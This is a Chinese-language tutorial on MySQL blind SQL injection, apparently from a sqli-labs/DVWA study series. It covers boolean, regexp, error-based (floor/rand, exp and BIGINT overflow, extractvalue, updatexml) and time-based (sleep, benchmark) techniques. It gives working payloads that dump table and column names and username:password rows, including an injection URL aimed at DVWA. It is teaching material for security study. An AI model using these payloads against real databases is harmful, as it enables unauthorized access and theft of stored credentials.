# 四、Background-2 盲注的讲解

盲注是在sql注入时执行命令后没有回显的尝试，盲注分为三类：
- 基于布尔的sql盲注
- 基于报错的sql盲注
- 基于时间的sql盲注

### 基于布尔sql盲注——构造逻辑判断
借用逻辑判断构造注入。<br>
Sql注入截取字符串常用函数博客：<https://www.cnblogs.com/lcamry/p/5504374.html><br>
三大法宝：`mid()`&emsp;`substr()`&emsp;`left()`

##### mid()函数
次函数为截取字符串一部分：`MID(column_name,start[,length])`
| 参数        | 描述 |
| ----        | -----|
| column_name | 必需。要提取字符的字段|
| start       | 必需。规定开始位置（起始值是 1）|
| length      | 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。 |

> Eg:      str="123456"     mid(str,2,1)    结果为2

> sql用例：<br>
（1）MID(DATABASE(),1,1)>’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。<br>
（2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。

##### substr()函数
Substr()和substring()函数实现的功能是一样的，均为截取字符串。<br>
`string substring(string, start, length)`<br>
`string substr(string, start, length)`

> 参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。

##### Left()函数
Left()得到字符串左部开始指定个数的字符：`Left ( string, n )`<br>
string为要截取的字符串，n为长度。
> Sql用例：<br>
(1) left(database(),1)>’a’,查看数据库名第一位，left(database(),2)>’ab’,查看数据库名前二位。<br>
(2) 同样的string可以为自行构造的sql语句。

##### ord()函数
同时也要介绍ORD()函数，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。<br>
> EG: `ORD(MID(DATABASE(),1,1))>114`<br> 意为检测database()的第一位ASCII码是否大于114，也即是'r'

ascii中：48～57为0到9十个阿拉伯数字，65～90为26个大写英文字母，97～122号为26个小写英文字母。

##### ascii函数
Ascii()将某个字符转换为ascii 值。
> EG:<br>
查看当前数据库第一个表名的第一个字符：`select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1));`<br>
布尔值判断：`ascii(substr((select database()),1,1))=98`

##### 正则注入
sql中正则注入作者博客：https://www.cnblogs.com/lcamry/articles/5717442.html>

> EG：
> 1. 判断第一个表名的第一个字符是否是a-z中的字符,其中blind_sqli是假设已知的库名<br>
> 注：正则表达式中 ^\[a-z] 表示字符串中开始字符是在 a-z范围内<br>
`index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-z]' LIMIT 0,1) /*`
> 2. 判断第一个表名的第一个字符是否是a-z中的字符,其中blind_sqli是假设已知的库名<br>
`index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-n]' LIMIT 0,1)/*`
> 3. 确定该字符为n<br>
`index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^n' LIMIT 0,1) /*`
> 4. 表达式的更换如下<br>
**`expression like this: '^n[a-z]' -> '^ne[a-z]' -> '^new[a-z]' -> '^news[a-z]' -> FALSE`**<br>
这时说明表名为news ，要验证是否是该表明 正则表达式为'^news$'，但是没这必要 直接判断 table_name = ’news‘ 不就行了。
> 5. 接下来猜解其它表了<br>
实验表明：在limit 0,1下，regexp会匹配所有的项，regexp匹配的时候会在所有的项都进行匹配<br>
`select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^u[a-z]' limit 0,1);是正确的`

- **注意：limit注意使用参数，配合限定where条件。limit 0,1是表示从第1条数据开始，取1条！默认开始为0，当为limit 2时表示取前2条记录。**

其他示例：
0. `select user() regexp '^ro';` 假如用户为root等，查询会返回1。
1. `select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));`<br>
2. `select * from users where id=1 and 1=(user() regexp '^ro')`<br>
3. `select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);`

### 思考一个问题？
limit是限定输出，并不是限定正则哦。

实验操作实例：security有emails,referers,uagents,users四个表
- 当`select table_name from information_schema.tables where table_schema='security' and table_name regexp '^[a-z]';`的时候，会把四个表都查询出：

| table_name |
| ---------- |
| emails     |
| referers   |
| uagents    |
| users      |

- 当`select table_name from information_schema.tables where table_schema='security' and table_name regexp '^[a-z]' limit 0,1;`或者`limit 1`的时候：

| table_name |
| ---------- |
| emails     |

- 当`select table_name from information_schema.tables where table_schema='security' and table_name regexp '^[a-z]' limit 2;`的时候：

| table_name |
| ---------- |
| emails     |
| referers   |

- 当`select table_name from information_schema.tables where table_schema='security' and table_name regexp '^[a-z]' limit 1,1;`的时候，结果是：

| table_name |
| ---------- |
| referers   |

- **注意此处**，当`select table_name from information_schema.tables where table_schema='security' and table_name regexp '^r[a-z]' limit 1,1;`的时候，结果是：

**Empty set (0.00 sec)**

**解析**：因为假如没有limit限制，会得到referers这个表，这里Limit从输出限制第2条开始取1条记录，显然是无输出。（limit 0,1表示从第1条记录取1条）

> 在这里我们应该明白到，limit只是限定查询的输出，并不是指限定由第2条记录来进行正则匹配。<br>
我们也无须知道表的顺序，只要有这个表即可。<br>
同时，也应当善用正则的$结尾符，还有like这个模糊匹配，如`like 'ro%'`

#### |--->探索rand()的秘密
##### help rand;得到如下结果
```sql
Name: 'RAND'
Description:
Syntax:
RAND(), RAND(N)

Returns a random floating-point value v in the range 0 <= v < 1.0. If a
constant integer argument N is specified, it is used as the seed value,
which produces a repeatable sequence of column values. In the following
example, note that the sequences of values produced by RAND(3) is the
same both places where it occurs.
# rand()返回范围为0 <= v <1.0的随机浮点值v。
# 如果一个指定了常量整数参数N，它用作种子值，产生可重复的列值序列。
# 在下面的例如，请注意RAND（3）产生的值序列是发生的两个地方都一样。

URL: http://dev.mysql.com/doc/refman/5.6/en/mathematical-functions.html

Examples:
mysql> CREATE TABLE t (i INT);
Query OK, 0 rows affected (0.42 sec)

mysql> INSERT INTO t VALUES(1),(2),(3);
Query OK, 3 rows affected (0.00 sec)
Records: 3  Duplicates: 0  Warnings: 0

mysql> SELECT i, RAND() FROM t;
+------+------------------+
| i    | RAND()           |
+------+------------------+
|    1 | 0.61914388706828 |
|    2 | 0.93845168309142 |
|    3 | 0.83482678498591 |
+------+------------------+
3 rows in set (0.00 sec)

mysql> SELECT i, RAND(3) FROM t;
+------+------------------+
| i    | RAND(3)          |
+------+------------------+
|    1 | 0.90576975597606 |
|    2 | 0.37307905813035 |
|    3 | 0.14808605345719 |
+------+------------------+
3 rows in set (0.00 sec)

mysql> SELECT i, RAND() FROM t;
+------+------------------+
| i    | RAND()           |
+------+------------------+
|    1 | 0.35877890638893 |
|    2 | 0.28941420772058 |
|    3 | 0.37073435016976 |
+------+------------------+
3 rows in set (0.00 sec)

mysql> SELECT i, RAND(3) FROM t;
+------+------------------+
| i    | RAND(3)          |
+------+------------------+
|    1 | 0.90576975597606 |
|    2 | 0.37307905813035 |
|    3 | 0.14808605345719 |
+------+------------------+
3 rows in set (0.01 sec)
```
此处表现，rand(seed)时候每次查询结果是一样，但同一次不同行查询的随机值不同。rand()是每次都随机取种子值，每次结果都不同。

生成5到10（含）之间的随机整数数的示例：
```sql
SELECT 
  FLOOR(RAND()*(10-5+1)+5) 'Result 1',
  FLOOR(RAND()*(10-5+1)+5) 'Result 2',
  FLOOR(RAND()*(10-5+1)+5) 'Result 3';
```


### 基于报错的SQL盲注——构造payload让信息通过错误提示回显出来

在这里我们需要的是sql报错，示例如下：

- `Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;`

    ERROR 1062 (23000): Duplicate entry '::root@localhost::1' for key 'group_key'<br>

    这里我们不是十分明白其中的报错原因，大概原理为分组后数据计数时重复造成的错误，也有解释为mysql的bug问题，此处需要将rand()和rand(0)多试几次才行。

- `select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));`

    ERROR 1062 (23000): Duplicate entry '5.6.171' for key 'group_key'
    
    这里得到version()的值为5.6.17，后面的1是由rand(0)得出，此处rand(0)会从随机的固定值得出一个随机值，floor(rand(0)*2)可得出0或1。
    
- `select count(*) from (select 1 union select null union select !1) t group by concat(version(),floor(rand(0)*2));`
    
    ERROR 1062 (23000): Duplicate entry '5.6.171' for key 'group_key'
    
    假如关键表被禁用，可以使用这种方式。<br>
    这里`select 1 union select null union select !1`会得出1,NULL,0。<br>
    还是在分组的时候会出mysql报错，而且必须是concat连接floor的随机整数才会分组失败，正常的‘1’字符串concat连接后是分组正常的。

- `select min(@a:=1) from information_schema.tables group by concat(table_name,@a:=(@a+1)%2)`
    
    如果rand()被禁用，可以使用用户变量来报错。
    放弃研究注意：select min(@a:=1) from information_schema.tables group by concat(table_name,@a:=(@a+1)%2)，这里是得到一个表名，证明存在漏洞即可。

- `select exp(~(select * FROM(SELECT USER())a));`
    
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
    
    // y = Exp(x)是以e为底的指数函数，即y=e的x次方。<br>
    其中 exp(-2) = 0.13533528323661，exp(0) = 1，exp(1) = 2.718281828459045。版本在5.5.5及以上。
    
    这里是double数值类型超出范围，user() = root@localhost，~(root@localhost) = 18446744073709551615，exp(数值>709)会报错。
    
    **使用exp进行SQL报错注入参考文章**：<https://www.cnblogs.com/lcamry/articles/5509124.html>
    
    * 0x01 概述
    
        \~是按位取反，~0=18446744073709551615，是最大的无符号BIGINT值。
        
    * 0x02 注入
        
        通过构造子查询并取反，造成一个DOUBLE overflow error，并借由此注出数据。
    
    * 0x03 注出数据——得到表名
    
        `select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));`
    
        ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'emails' from dual)))'

    * 0x03 注出数据——得到列名
        
        `select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));`
        
        ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'user_id' from dual)))
        
        放弃研究注意：这里只是得出单条数据，单条记录，个人讨论后无法从limit下手的，报错机制并没有给出预期结果，请从下面的@遍历爆出吧！
    
    * 0x03 注出数据——检索数据
    
        `select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));`
        
        ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '1:Dumb:Dumb' from dual)))'
        
    * 0x04 一蹴而就
    
        这个查询可以从当前上下文中dump出所有的tables和columns。
        
        ```sql
        # 例如url:
        http://localhost/dvwa/vulnerabilities/sqli/?id=1' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))-- -&Submit=Submit#
        
        # 这里可以直接从mysql shell查询出来：
        select exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x));
        
        # 返回结果如下
        ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '000
        security::emails::id
        security::emails::email_id
        security::referers::id
        security::referers::referer
        security::referers::ip_address
        security::uagents::id
        security::uagents::uagent
        security::uagents::ip_address
        security::uagents::username
        security::users::id
        security::users::username
        security::users::password' from dual)))'
        
        # 注意上述语句也可以在其他增删改查均可以注入哦，其中exp需要在mysql5.5.5及以上版本。
        ```
        
        最终语句如下：
        ```sql
        exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))
        ```
        
- `select !(select * from (select user())x) - ~0;`

    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))'
    
    注意这里是减号。
    
    **基于BIGINT溢出错误的SQL注入**：<https://www.cnblogs.com/lcamry/articles/5509112.html>
    
    * 0x01 概述
        
        数据类型BIGINT的长度为8字节，也就是说，长度为64比特，最大数值为9223372036854775807。
    
        ~0是逐位取反，得到的是无符号最大值，为18446744073709551615。
    
    * 0x02 注入技术
        
        如果我们对~0进行加减运算的话，会导致BIGINT溢出错误。因此，我们利用子查询引起BIGINT溢出，设法提取数据。
        
        我们知道，一个查询成功返回，其返回值为0，逻辑非运算得1。示例：
        
        `mysql> select !(select*from(select user())x);`
    
        | !(select*from(select user())x) |
        |--------------------------------|
        |                              1 |
    
        1 row in set (0.00 sec)
    
        我们再对其进行加减运算：
        
        `select ~0+!(select*from(select user())x);`
        
        ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + (not((select 'root@localhost' from dual))))'
        
        注意：我们不常用加法，因为“+”通过网页浏览器解析会转为空白符，此时可以用%2b来表示+。**常用减法**。
        
        最终语句如下：
        ```sql
        !(select*from(select user())x)-~0
        (select(!x-~0)from(select(select user())x)a)
        (select!x-~0.from(select(select user())x)a)
        ```
    
    * 0x03 提取数据——获得表名
        
        `select !(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0;`
        
        ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'emails' from dual))) - ~(0))'
        
    * 0x03 提取数据——获得列名
     
        `select !(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x)-~0;`
    
        ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'user_id' from dual))) - ~(0))'
    
    * 0x03 提取数据——检索数据
    
        `select !(select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)-~0;`
        
        ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '1:Dumb:Dumb' from dual))) - ~(0))'
        
    * 0x04 一次性转储
        
        ```sql
        !(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0
        
        (select(!x-~0)from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)
        
        (select!x-~0.from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)
        ```
        
        注意，毕竟我们是通过错误消息来检索数据的，在从当前数据库转储检索时，会限制了最多27个结果，即最多会返回27个列，多出的都无法返回。
        
        当然，以上3条语句均可以在增删改查其他地方进行注入攻击。
        
        另外需要再次注意的一点是，这些均因为mysql 5.5.5及以上版本会提供mysql_error()。

- `select extractvalue(1,concat(0x7e,(select @@version),0x7e));`

    ERROR 1105 (HY000): XPATH syntax error: '~5.6.17~'
    
    解释：mysql 对xml 数据进行检查查询的xpath 函数，xpath 语法错误
    
- `select updatexml(1,concat(0x7e,(select @@version),0x7e),1);`

    ERROR 1105 (HY000): XPATH syntax error: '~5.6.17~'
    
    解释：//mysql 对xml 数据进行修改的xpath 函数，xpath 语法错误，注意顺序不能调换
    
- `select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;`

    ERROR 1060 (42S21): Duplicate column name '5.6.17'

    解释：mysql 重复特性，此处重复了version，所以报错。


### 基于时间的SQL盲注——延时注入

基础判断执行sleep：`select If(ascii(substr(database(),1,1))>115,0,sleep(5))%23` <br>
其中115是s，%23是#

##### 利用sleep()延时注入语句
`select sleep(find_in_set(mid(@@version, 1, 1), '0,1,2,3,4,5,6,7,8,9,.'));`

| sleep(find_in_set(mid(@@version, 1, 1), '0,1,2,3,4,5,6,7,8,9,.')) |
|---------------------------------------------------------|
|                                                       0 |

1 row in set (1.00 sec)

解释：find_in_set表示从后面set找前面的元素，这里元素version的第一个值是5，得到的index是6，所以会停顿6秒，并且查询成功，返回0。

##### 性测测试延迟注入
```sql
UNION 
SELECT 
IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null)
FROM (select database() as current) as tb1;
```

解释：BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu 资源。推荐使用sleep()函数进行注入。


